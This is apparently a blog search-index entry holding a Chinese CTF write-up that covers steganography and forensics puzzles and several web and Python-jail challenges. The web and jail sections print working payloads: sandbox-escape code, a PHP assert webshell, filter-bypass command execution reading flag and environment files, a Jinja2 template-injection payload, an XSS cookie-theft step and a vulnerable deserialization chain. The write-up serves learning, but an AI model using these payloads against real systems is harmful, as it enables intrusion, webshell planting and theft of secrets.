<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>fhacker wp</title>
    <link href="/2025/03/24/wp/"/>
    <url>/2025/03/24/wp/</url>
    
    <content type="html"><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h3 id="ez-jpg"><a href="#ez-jpg" class="headerlink" title="ez_jpg"></a><strong>ez_jpg</strong></h3><p>Base64解码，开头为9DFF，反过来为FFD9，是jpg的文件尾</p><p>![屏幕截图 2025-03-01 192434](..&#x2F;images&#x2F;屏幕截图 2025-03-01 192434.png) </p><p>使用反转工具</p><p>![屏幕截图 2025-03-01 200409](..&#x2F;images&#x2F;屏幕截图 2025-03-01 200409.png) </p><p>导入到010</p><p>![屏幕截图 2025-03-01 193807](..&#x2F;images&#x2F;屏幕截图 2025-03-01 193807.png)   </p><p>是一张杂乱的图片</p><p> <img src="/../images/flag1.jpg" alt="flag1"> </p><p>再拖进010</p><p>![屏幕截图 2025-03-26 001852](..&#x2F;images&#x2F;屏幕截图 2025-03-26 001852.png) </p><p>修改宽高</p><p>![屏幕截图 2025-03-26 003603](..&#x2F;images&#x2F;屏幕截图 2025-03-26 003603.png) </p><p><img src="/../images/wps6.png" alt="img">  </p><p>SYC{Steg_4nd_Zip_1s_G00d!}</p><h3 id="Truth-of-Word"><a href="#Truth-of-Word" class="headerlink" title="Truth of Word"></a><strong>Truth of Word</strong></h3><p>（1）</p><p>![屏幕截图 2025-03-01 202053](..&#x2F;images&#x2F;屏幕截图 2025-03-01 202053.png) </p><p>Flag01&#x3D;SYC{W0rd_H@5</p><p>（2）</p><p>改后缀名，.docx改为.zip</p><p>![屏幕截图 2025-03-02 152005](..&#x2F;images&#x2F;屏幕截图 2025-03-02 152005.png) </p><p>.bin文件，改后缀为zip</p><p>![屏幕截图 2025-03-02 151931](..&#x2F;images&#x2F;屏幕截图 2025-03-02 151931.png) </p><p>![屏幕截图 2025-03-01 202908](..&#x2F;images&#x2F;屏幕截图 2025-03-01 202908.png) </p><p>Flag02 &#x3D; @<em>Ama1n9</em>  </p><p>（3）</p><p>![屏幕截图 2025-03-01 201853](..&#x2F;images&#x2F;屏幕截图 2025-03-01 201853.png)      <img src="/../images/wps12.jpg" alt="wps12">  </p><p> FLAG03&#x3D;StrUCtu3e!}</p><p>SYC{W0rd_H@5@_Ama1n9_StrUCtu3e!}</p><h3 id="ez-pcap-1"><a href="#ez-pcap-1" class="headerlink" title="ez_pcap_1"></a><strong>ez_pcap_1</strong></h3><p>SMB文件</p><p><img src="/../images/wps13.jpg" alt="wps13"> </p><p><img src="/../images/wps14.jpg" alt="wps14"> </p><h3 id="雪"><a href="#雪" class="headerlink" title="雪"></a><strong>雪</strong></h3><p>zip拖进010</p><p>![屏幕截图 2025-03-04 220739](..&#x2F;images&#x2F;屏幕截图 2025-03-04 220739.png) </p><p>base64解码  W3LC0M4，是文件的密码</p><p>盲水印提取</p><p>![屏幕截图 2025-03-04 190323](..&#x2F;images&#x2F;屏幕截图 2025-03-04 190323.png) </p><p>Th1si4st8eK3y</p><p>随波逐流，雪花隐写</p><p>![屏幕截图 2025-03-21 183632](..&#x2F;images&#x2F;屏幕截图 2025-03-21 183632.png)</p><p><img src="/../images/wps18.jpg" alt="wps18"> </p><h3 id="舔狗的觉醒"><a href="#舔狗的觉醒" class="headerlink" title="舔狗的觉醒"></a><strong>舔狗的觉醒</strong></h3><p>密码爆破</p><p>![屏幕截图 2025-03-04 221103](..&#x2F;images&#x2F;屏幕截图 2025-03-04 221103.png) </p><p>50 4b 03 04是zip的文件头</p><p>每两位左右交换</p><p>![屏幕截图 2025-03-04 221144](..&#x2F;images&#x2F;屏幕截图 2025-03-04 221144.png) </p><p>AI脚本</p><p>![屏幕截图 2025-03-04 221359](..&#x2F;images&#x2F;屏幕截图 2025-03-04 221359.png) </p><p>得到pdf文件</p><p>![屏幕截图 2025-03-04 221443](..&#x2F;images&#x2F;屏幕截图 2025-03-04 221443.png) </p><p>把图片拖走</p><p>![屏幕截图 2025-03-21 190625](..&#x2F;images&#x2F;屏幕截图 2025-03-21 190625.png) </p><p>SYC{Y0u_arE_y0uR_0wn_hero}</p><h3 id="cimbar"><a href="#cimbar" class="headerlink" title="cimbar"></a><strong>cimbar</strong></h3><p><img src="/../images/wps24.jpg" alt="wps24">![屏幕截图 2025-03-03 212556](..&#x2F;images&#x2F;屏幕截图 2025-03-03 212556.png) </p><p>![屏幕截图 2025-03-21 193509](..&#x2F;images&#x2F;屏幕截图 2025-03-21 193509.png) </p><h3 id="乌龟"><a href="#乌龟" class="headerlink" title="乌龟"></a><strong>乌龟</strong></h3><p>SSTV扫描，得到图片</p><p><img src="/../images/wps27.jpg" alt="wps27"> </p><p>PASS:Be4uti7ulSun5e7密钥</p><p>![屏幕截图 2025-03-21 195521](..&#x2F;images&#x2F;屏幕截图 2025-03-21 195521.png) </p><p>得到serect.txt</p><p>![屏幕截图 2025-03-21 195714](..&#x2F;images&#x2F;屏幕截图 2025-03-21 195714.png) </p><p>看不懂，问AI，这段代码是用 Logo 语言编写的</p><p>找一个在线工具</p><p>![屏幕截图 2025-03-21 172303](..&#x2F;images&#x2F;屏幕截图 2025-03-21 172303.png) </p><p>SYC{TU3T1E_P4INTING}</p><h3 id="Welcome-jail"><a href="#Welcome-jail" class="headerlink" title="Welcome_jail"></a><strong>Welcome_jail</strong></h3><p>连接靶机</p><p> <img src="/../images/image-20250325191104302.png" alt="image-20250325191104302"></p><p> 看到过滤 <code>[&#39;import&#39;, &#39;os&#39;, &#39;00&#39;]</code></p><p><code>open(chr(102)+chr(108)+chr(97)+chr(103)).read()</code><img src="/../images/image-20250325191944908.png" alt="image-20250325191944908">     </p><p>flag不在&#x2F;flag文件中</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">print(<span class="hljs-name">__builtins__</span>.__dict__[&#x27;eval&#x27;](<span class="hljs-name">__import__</span>(&#x27;os&#x27;).popen(&#x27;cat /home/ctf/flag&#x27;).read()))<br></code></pre></td></tr></table></figure><p>用chr绕过</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">print</span>(__builtins__.__dict__[bytes([<span class="hljs-number">101</span>,<span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">108</span>]).decode()](bytes([<span class="hljs-number">95</span>,<span class="hljs-number">95</span>,<span class="hljs-number">105</span>,<span class="hljs-number">109</span>,<span class="hljs-number">112</span>,<span class="hljs-number">111</span>,<span class="hljs-number">114</span>,<span class="hljs-number">116</span>,<span class="hljs-number">95</span>,<span class="hljs-number">95</span>,<span class="hljs-number">40</span>,<span class="hljs-number">39</span>,<span class="hljs-number">111</span>,<span class="hljs-number">115</span>,<span class="hljs-number">39</span>,<span class="hljs-number">41</span>,<span class="hljs-number">46</span>,<span class="hljs-number">112</span>,<span class="hljs-number">111</span>,<span class="hljs-number">112</span>,<span class="hljs-number">101</span>,<span class="hljs-number">110</span>,<span class="hljs-number">40</span>,<span class="hljs-number">39</span>,<span class="hljs-number">99</span>,<span class="hljs-number">97</span>,<span class="hljs-number">116</span>,<span class="hljs-number">32</span>,<span class="hljs-number">47</span>,<span class="hljs-number">104</span>,<span class="hljs-number">111</span>,<span class="hljs-number">109</span>,<span class="hljs-number">101</span>,<span class="hljs-number">47</span>,<span class="hljs-number">99</span>,<span class="hljs-number">116</span>,<span class="hljs-number">102</span>,<span class="hljs-number">47</span>,<span class="hljs-number">102</span>,<span class="hljs-number">108</span>,<span class="hljs-number">97</span>,<span class="hljs-number">103</span>,<span class="hljs-number">39</span>,<span class="hljs-number">41</span>,<span class="hljs-number">46</span>,<span class="hljs-number">114</span>,<span class="hljs-number">101</span>,<span class="hljs-number">97</span>,<span class="hljs-number">100</span>,<span class="hljs-number">40</span>,<span class="hljs-number">41</span>]).decode()))<br></code></pre></td></tr></table></figure><img src="C:\Users\31626\AppData\Roaming\Typora\typora-user-images\image-20250326205603652.png" alt="image-20250326205603652" style="zoom:80%;" /> <p>还有一种方法，获取<code>os._wrap_close</code>  类下标</p><p>需要写脚本获取下标数，但我不会</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">([].__class__.__base__.__subclasses__()</span></span><span class="hljs-selector-attr">[-4]</span>.__init__.__globals__<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;popen&#x27;</span>]</span>(<span class="hljs-string">&#x27;env&#x27;</span>)<span class="hljs-selector-class">.read</span>())<br></code></pre></td></tr></table></figure><p>还是用chr绕过</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">print([].__class__.__base__.__subclasses__()[<span class="hljs-number">-4</span>].__init__.__globals__[chr(<span class="hljs-number">112</span>)+chr(<span class="hljs-number">111</span>)+chr(<span class="hljs-number">112</span>)+chr(<span class="hljs-number">101</span>)+chr(<span class="hljs-number">110</span>)](<span class="hljs-name">chr</span>(<span class="hljs-number">101</span>)+chr(<span class="hljs-number">110</span>)+chr(<span class="hljs-number">118</span>)).read())<br></code></pre></td></tr></table></figure><h3 id="友谊地久天长"><a href="#友谊地久天长" class="headerlink" title="友谊地久天长"></a>友谊地久天长</h3><p>有一张损坏的图片，放到随波逐流，发现文件头被修改                                                                <img src="/../images/44F2E635@A84FA51-%E4%BF%AE%E5%A4%8D%E6%96%87%E4%BB%B6%E5%A4%B4.png" alt="44F2E635@A84FA51-修复文件头"></p><p>得到的图片不全，再放到随波逐流 ，发现CRC结果，AT应为IDAT                                                                                          <img src="/../images/image-20250325001412774.png" alt="image-20250325001412774"></p><p>放到010，变成IDAT，49 44 41 54                                                                                                          <img src="/../images/image-20250325001631142.png" alt="image-20250325001631142"></p><p>修复后得到完整的二维码，扫出来是 Super_Snow_Sword_is_so_handsome!</p><p><img src="/../images/44F2E635@A840FA51-%E4%BF%AE%E5%A4%8D%E6%96%87%E4%BB%B6%E5%A4%B4.png" alt="44F2E635@A840FA51-修复文件头">    </p><p>另一个是 .crypto文件，没见过，搜索一下</p><p><img src="/../images/image-20250324235215871.png" alt="image-20250324235215871">                                                                                                                                下载Encrypto，密码为上面二维码扫出的内容</p><p><img src="/../images/image-20250324235438757.png" alt="image-20250324235438757">         </p><p>得到一个mp3文件，但这个音频没用…..</p><p><img src="/../images/image-20250324235650031.png" alt="image-20250324235650031">  </p><p>foremost文件提取出一张图片                                                                              <img src="/../images/00000002.png" alt="00000002"></p><p>LSB隐写                                                                                 ![Blue plane 0](..&#x2F;images&#x2F;Blue plane 0.bmp)</p><p>中间有字，放到stegsolve里的Stereogram Solver:立体试图 左右控制偏移                       <img src="/../images/solved.bmp" alt="solved"></p><h3 id="史上最没节操的游戏"><a href="#史上最没节操的游戏" class="headerlink" title="史上最没节操的游戏"></a><strong>史上最没节操的游戏</strong></h3><p><strong>（1）游乐园</strong></p><p>wireshark，http</p><p><img src="/../images/image-20250327224122359.png" alt="image-20250327224122359">        </p><p><img src="/../images/image-20250327224720879.png" alt="image-20250327224720879"> </p><p><strong>（2）电影院</strong></p><p>音频里有电报声，去bilibili下载原音频，用AU分离，反相</p><p><img src="/../images/image-20250327231335894.png" alt="image-20250327231335894"> </p><p>SSTV扫描 </p><p><img src="/../images/2025-03-27_23.31.26.jpg" alt="2025-03-27_23.31.26"> </p><p>访问<a href="https://www.cnblogs.com/handsomesnowsword%EF%BC%8C%E4%B8%8D%E6%96%AD%E5%88%B7%E6%96%B0">https://www.cnblogs.com/handsomesnowsword，不断刷新</a></p><p>![屏幕截图 2025-03-22 002451](..&#x2F;images&#x2F;屏幕截图 2025-03-22 002451.png) </p><p>_YPneR:2galf</p><p>flag2:RenPY_</p><p><strong>（3）漫展</strong></p><p>用aleappGUI进行手机取证</p><p>![屏幕截图 2025-03-28 230740](..&#x2F;images&#x2F;屏幕截图 2025-03-28 230740.png)</p><p>手机热点</p><p>![屏幕截图 2025-03-28 230842](..&#x2F;images&#x2F;屏幕截图 2025-03-28 230842.png)</p><p>![屏幕截图 2025-03-28 230925](..&#x2F;images&#x2F;屏幕截图 2025-03-28 230925.png) </p><p>欠了多少钱，250000</p><p>![屏幕截图 2025-03-28 231037](..&#x2F;images&#x2F;屏幕截图 2025-03-28 231037.png)</p><p>欠的是谁的钱，电话号码为1231231233，QB</p><p>![屏幕截图 2025-03-28 231402](..&#x2F;images&#x2F;屏幕截图 2025-03-28 231402.png)</p><p>在哪里，下北沢</p><p>![屏幕截图 2025-03-28 231530](..&#x2F;images&#x2F;屏幕截图 2025-03-28 231530.png) </p><p>浏览记录</p><p>![屏幕截图 2025-03-28 231750](..&#x2F;images&#x2F;屏幕截图 2025-03-28 231750.png)</p><p>访问</p><p>![屏幕截图 2025-03-28 231937](..&#x2F;images&#x2F;屏幕截图 2025-03-28 231937.png) </p><p>藏头诗  FLAG3:WHERE_YOU_CAN_</p><p><strong>（4）法庭</strong></p><p>内存取证</p><p>![屏幕截图 2025-03-28 233732](..&#x2F;images&#x2F;屏幕截图 2025-03-28 233732.png</p><p>![屏幕截图 2025-03-28 233844](..&#x2F;images&#x2F;屏幕截图 2025-03-28 233844.png) </p><p>![屏幕截图 2025-03-28 234246](..&#x2F;images&#x2F;屏幕截图 2025-03-28 234246.png) </p><p>netscan</p><p>![屏幕截图 2025-03-28 234359](..&#x2F;images&#x2F;屏幕截图 2025-03-28 234359.png)</p><p>![屏幕截图 2025-03-28 234515](..&#x2F;images&#x2F;屏幕截图 2025-03-28 234515.png) </p><p><strong>flag4</strong></p><p><img src="C:/Users/31626/AppData/Roaming/Typora/typora-user-images/image-20250328235259949.png" alt="image-20250328235259949"> </p><p>xyzzz   fjuth</p><p>维吉尼亚解密</p><p><img src="/../images/2021041215573434.png" alt="2021041215573434"> </p><p>提取码为前四位 ILVUI</p><p>flag4：have_fun_</p><p><img src="C:/Users/31626/AppData/Roaming/Typora/typora-user-images/image-20250328235345158.png" alt="image-20250328235345158"> </p><p>看作者的QQ空间，324</p><p>flag{welcome_to_RenPY_WHERE_YOU_CAN_have_fun_324}</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h3 id="100-的圆"><a href="#100-的圆" class="headerlink" title="100%的圆"></a><strong>100%的圆</strong></h3><p><img src="/../images/wps35.jpg" alt="wps35"> </p><p>Base64解码</p><p><img src="/../images/wps36.jpg" alt="wps36"> </p><h3 id="ez-http"><a href="#ez-http" class="headerlink" title="ez-http"></a><strong>ez-http</strong></h3><p>cookie用了JWT加密，hasFlag为 false，需要将其改为true</p><p>![屏幕截图 2025-03-22 154935](..&#x2F;images&#x2F;屏幕截图 2025-03-22 154935.png) </p><p>AI脚本</p><p>![屏幕截图 2025-03-22 155317](..&#x2F;images&#x2F;屏幕截图 2025-03-22 155317.png) </p><p> ![屏幕截图 2025-03-22 154735](..&#x2F;images&#x2F;屏幕截图 2025-03-22 154735.png)</p><h3 id="baby-upload"><a href="#baby-upload" class="headerlink" title="baby_upload"></a><strong>baby_upload</strong></h3><p>白名单后缀绕过，只对第一个后缀名进行了黑名单检测</p><p>![屏幕截图 2025-03-22 164501](..&#x2F;images&#x2F;屏幕截图 2025-03-22 164501.png) </p><p>返回为空，上传成功</p><p>![屏幕截图 2025-03-22 164608](..&#x2F;images&#x2F;屏幕截图 2025-03-22 164608.png) </p><p>蚁剑访问</p><p>![屏幕截图 2025-03-22 163527](..&#x2F;images&#x2F;屏幕截图 2025-03-22 163527.png) </p><h3 id="SecretInDrivingSchool"><a href="#SecretInDrivingSchool" class="headerlink" title="SecretInDrivingSchool"></a><strong>SecretInDrivingSchool</strong></h3><p>![屏幕截图 2025-03-22 210726](..&#x2F;images&#x2F;屏幕截图 2025-03-22 210726.png) </p><p>访问&#x2F;L000G1n.php</p><p>![屏幕截图 2025-03-22 210758](..&#x2F;images&#x2F;屏幕截图 2025-03-22 210758.png)                    </p><p>密码猜是SYC….</p><p>进入后台，广告修改，传个一句话木马，eval被过滤了，用assert</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>![屏幕截图 2025-03-22 202934](..&#x2F;images&#x2F;屏幕截图 2025-03-22 202934.png) </p><p>再回到首页直接cat flag</p><p>![屏幕截图 2025-03-22 204128](..&#x2F;images&#x2F;屏幕截图 2025-03-22 204128.png) </p><p>![屏幕截图 2025-03-22 204132](..&#x2F;images&#x2F;屏幕截图 2025-03-22 204132.png) </p><p>或</p><p>![屏幕截图 2025-03-22 204640](..&#x2F;images&#x2F;屏幕截图 2025-03-22 204640.png) </p><p>或</p><p>字符串拼接起来执行就能绕过</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$a = <span class="hljs-string">&#x27;syst&#x27;</span> . <span class="hljs-string">&#x27;em&#x27;</span><span class="hljs-comment">;</span><br>$a(<span class="hljs-string">&#x27;env&#x27;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>或</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function">echo <span class="hljs-title">readgzfile</span><span class="hljs-params">(<span class="hljs-string">&quot;/flag&quot;</span>)</span></span>;<br><span class="hljs-comment">//readgzfile 函数会尝试打开并读取指定路径的 gzip 压缩文件，然后把文件内容输出到标准输出（通常是浏览器页面）。</span><br></code></pre></td></tr></table></figure><p>或</p><p>过滤了eval，system，用 &#96;&#96; 执行系统命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> `<span class="hljs-built_in">cat</span> /flag`;<br></code></pre></td></tr></table></figure><h3 id="Can-you-Pass-Me"><a href="#Can-you-Pass-Me" class="headerlink" title="Can_you_Pass_Me"></a>Can_you_Pass_Me</h3><p>一把梭 env|base64</p><p><img src="/../images/image-20250325212450109.png" alt="image-20250325212450109"></p><p>base64解码</p><p><img src="/../images/image-20250325212602797.png" alt="image-20250325212602797"></p><p>或</p><p>ls读取目录</p><p><img src="/../images/image-20250325212711596.png" alt="image-20250325212711596"></p><p>读取app.py查看源码</p><p><img src="/../images/image-20250325212759126.png" alt="image-20250325212759126"> </p><p>AI分析代码</p><p><img src="/../images/image-20250325213528234.png" alt="image-20250325213528234"></p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">print</span>(lipsum<span class="hljs-punctuation">|</span>attr(<span class="hljs-string">&#x27;__glob&#x27;</span><span class="hljs-string">&#x27;als__&#x27;</span>)<span class="hljs-punctuation">|</span>attr(<span class="hljs-string">&#x27;__g&#x27;</span><span class="hljs-string">&#x27;et&#x27;</span><span class="hljs-string">&#x27;item__&#x27;</span>)(<span class="hljs-string">&#x27;o&#x27;</span><span class="hljs-string">&#x27;s&#x27;</span>))<span class="hljs-punctuation">|</span>attr(<span class="hljs-string">&#x27;pop&#x27;</span><span class="hljs-string">&#x27;en&#x27;</span>)(<span class="hljs-string">&#x27;cd ..;cat f*&#x27;</span>)<span class="hljs-punctuation">|</span>attr(<span class="hljs-string">&#x27;re&#x27;</span><span class="hljs-string">&#x27;ad&#x27;</span>)()<span class="hljs-punctuation">|</span>list<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">//结果中不能包含flag文件内容，通过list来转换为列表绕过（将字符拼接输出）</span><br><span class="language-xml">//cd ..;cat f*     返回上级目录；f*为通配符，*表示匹配任意字符序列，f*会匹配到所有以f开头的文件</span><br></code></pre></td></tr></table></figure><h3 id="rce-me"><a href="#rce-me" class="headerlink" title="rce_me"></a>rce_me</h3><p><img src="/../images/image-20250325215422870.png" alt="image-20250325215422870"> </p><p><code>md5(&quot;Geekchallenge2024_bmKtL&quot;)</code>就是经典0e，找一个数字sha1后0e的<br>当PHP版本小于8时，如果参数中出现中括号[，中括号会被转换成下划线_</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">_</span>[<span class="hljs-number">2024</span>.geekchallenge.ctf=<span class="hljs-number">0</span>e1290633704<br></code></pre></td></tr></table></figure><p><img src="/../images/image-20250325220609080.png" alt="image-20250325220609080"> </p><p>变量覆盖，后面的在get传对应参数名</p><p><img src="/../images/image-20250325221127949.png" alt="image-20250325221127949"> </p><p>科学计数法中e在intval时解析成字母，截断转换，而在加法中正常表现为科学计数法</p><p>intval函数<strong>不能正常解析字符串形式的科学表达式</strong>，会返回底数<br><code>intval($year)</code>解析字符串<code>&#39;2023e2&#39;</code>返回2023<br>后面的是<code>$year+1</code>，数字和字符串相加，php会把字符串转为数字再相加，所以就会被解析为2023*2023</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">year</span>=2023e2&amp;purpose[]=rce&amp;<span class="hljs-attribute">code</span>=system(&#x27;cat /flag<span class="hljs-string">&#x27;);</span><br></code></pre></td></tr></table></figure><p>purpose传数组就行，preg_match无法处理数组</p><p>输入<code>purpose=rce</code>也可以，</p><p>正则表达式 <code>/.+?rce/ism</code> 可以拆解成以下部分：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-bullet">. </span>：表示匹配任何单个字符（除了换行符）。<br>+ ：表示匹配前面的字符（在这里是 . ）一次或多次。即 . 会匹配一个或多个任意字符。<br>? ：是一个“懒惰模式”（非贪婪匹配），意味着匹配尽可能少的字符。与 + 一起使用时，表示尽可能少地匹配字符。<br>.+? ：表示匹配一个或多个任意字符（但尽可能少匹配）。这意味着它会尽量少地匹配字符，直到遇到“rce”字符串为止。<br><br>修饰符 ism ：<br>i ：表示匹配时不区分大小写。<br>s ：表示让 . 能够匹配换行符。<br>m ：表示多行模式， ^ 和 $ 分别匹配行首和行尾，而不是字符串的开始和结束。<br></code></pre></td></tr></table></figure><p><code>purpose=rce</code>可任意绕过正则匹配</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">.+<span class="hljs-string">?：</span>要求在 rce 前至少有一个字符，但 rce 自身没有前导字符。因此，不会匹配。<br></code></pre></td></tr></table></figure><p>eval执行命令</p><p><img src="/../images/image-20250325220515228.png" alt="image-20250325220515228"> </p><h3 id="Problem-On-My-Web"><a href="#Problem-On-My-Web" class="headerlink" title="Problem_On_My_Web"></a><strong>Problem_On_My_Web</strong></h3><p>反射型XSS，留言板过滤不严导致XSS</p><script>alert(document.cookie);</script><p><img src="/../images/image-20250326214745353.png" alt="image-20250326214745353"> </p><p><code>url=http://127.0.0.1</code>  触发攻击，在XSS平台拿到cookie，内含flag：</p><p><img src="/../images/image-20250326220049175.png" alt="image-20250326220049175"> </p><h3 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h3><p><strong><code>__call</code> 方法</strong>：当调用对象中不存在的方法时触发</p><p><strong><code>__destruct</code> 方法</strong>：对象销毁时触发</p><p><strong><code>__invoke</code> 方法</strong>：对象被当作函数调用时触发</p><p><strong><code>__get</code> 方法</strong>：访问对象中不存在的属性时触发</p><p><strong><code>__toString</code> 方法</strong>：对象被当作字符串使用时触发</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>Class SYC&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$starven</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/%|iconv|UCS|UTF|rot|quoted|base|zlib|zip|read/i&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;starven))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;no hack&#x27;</span>);<br>        &#125;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;starven,<span class="hljs-string">&quot;&lt;?php exit();&quot;</span>.<span class="hljs-variable">$this</span>-&gt;starven);<br>    &#125;<br>&#125;<br><br>Class lover&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$J1rry</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$meimeng</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;J1rry)&amp;&amp;<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;J1rry)==<span class="hljs-string">&#x27;Welcome GeekChallenge 2024&#x27;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;success&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;meimeng-&gt;source;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;meimeng;<br>    &#125;<br><br>&#125;<br><br>Class Geek&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$GSBP</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br>        <span class="hljs-variable">$Challenge</span> = <span class="hljs-variable language_">$this</span>-&gt;GSBP;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$Challenge</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;GSBP-&gt;<span class="hljs-title function_ invoke__">Getflag</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Just do it&quot;</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>])&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/meimeng/i&quot;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no hack&quot;</span>);<br>    &#125;<br>   <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>   <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span 